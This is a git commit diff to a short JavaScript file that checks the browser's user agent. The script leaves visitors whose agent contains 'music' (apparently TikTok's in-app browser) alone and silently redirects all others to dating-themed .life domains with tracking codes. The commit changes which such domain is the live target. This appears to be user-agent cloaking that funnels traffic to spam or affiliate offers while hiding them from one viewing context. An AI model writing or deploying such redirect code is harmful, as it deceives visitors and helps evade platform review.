889cab425caaf64b7c6e714051a5f704fe9f4f63
FixYourSelf1 <72053190+FixYourSelf1@users.noreply.github.com>
2024-05-07 05:38:54 +0300

    Update usrag.js

--- usrag.js
+++ usrag.js
@@ -3,7 +3,7 @@ let agent = navigator.userAgent;
 if (agent.indexOf('music') >= 0) {
   console.log('in tiktok app');
 } else {
-  // window.location = 'https://datinghugflirt.life/?u=13bk60m&o=0rygz59';
-  window.location = 'https://thelivelyromance.life/?u=13bk60m&o=0rupv4g';
+  // window.location = 'https://heartflutter.life/?u=rudktec&o=9kgp9mx';
+  window.location = 'https://heartflutter.life/?u=rudktec&o=9kgp9mx';
 }
 // document.querySelector('body').innerText = agent;
